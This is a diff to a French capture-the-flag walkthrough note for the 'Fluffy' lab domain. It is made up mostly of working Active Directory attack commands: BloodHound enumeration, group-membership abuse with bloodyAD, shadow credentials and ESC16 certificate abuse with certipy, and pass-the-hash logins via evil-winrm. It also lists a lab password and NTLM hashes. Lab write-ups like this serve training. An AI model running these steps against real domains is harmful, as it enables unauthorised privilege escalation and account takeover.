@@ -136,11 +136,97 @@ P.AGILA::FLUFFY:828d30c22787b417:7f6dfeeefa5f40ee33910ac743f11df7:01010000000000
 
 p.agila:prometheusx-303
 
+# Lateral Movement to user
+
+## Local enumeration
+
+### BloodHound
+
+Voyons ce qu'on peut trouver avec bloodhound et les creds de p.agila :
+```sh
+bloodhound-python -u $User -p $Pass -d $Domain -dc $DCName -ns $DNSIP -c all
+```
+ On decouvre que notre compte est membre d'un groupe ayant les droit genericall sur le groupe service accounts :
+ ![[Pasted image 20260814213309.png]]
+ Et que ce groupe possède genericwrite sur 3 comptes
+
+![[Pasted image 20260814213338.png]]
+
+
+
+## Lateral movement vector
+
+On va utiliser les droits pour se connecter en tant que winrm_svc (et ca_svc au passage)
+```sh
+# On ajoute p.agila au groupe service accounts
+bloodyad -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host $IP add groupMember 'service accounts' p.agila
+
+# Comme on a un probleme d'horloge on desactive le NTP et se sync sur l'AD
+sudo timedatectl set-ntp off
+sudo ntpdate dc01.fluffy.htb
+
+# On fait ensuite un shadow credential avec certipy
+certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+
+# Puis on se connecte 
+evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
+
+```
+
+
+
 # Privilege Escalation
+
+## Local enumeration
+
+### ADCS
+
+On a u compte qui peut gérer des certificats donc énumérons les service de certificats
+```sh
+# Avec nxc
+nxc ldap $IP -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
+# On confirme la presence d'adcs
+
+# On utilise certipy pour chercher les templates vulnerable
+certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -vulnerable -enabled -stdout
+
+--snip--
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+
+# On voit une vuln identifiée
+
+```
+## PrivEsc vector
+
+Allons voir [[ESCXX]]
+
+Suivons le tuto :
+
+```sh
+# On change le UPN de ca_svc
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'administrator'
+
+# On demande un certificat pour ca_svc (qui sera donné en tant que administrator)
+certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '$IP' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+
+# On remet le bon UPN a ca_svc
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
+
+# On recupere le hash de administrator
+certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip $IP
+
+# On PtH
+evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
+```
 
 # Pillaging
 
-# Lateral Movement
+ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8
 
 # Flags / Proof
 
@@ -148,4 +234,3 @@ p.agila:prometheusx-303
 
 # Related Notes
 
-ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8
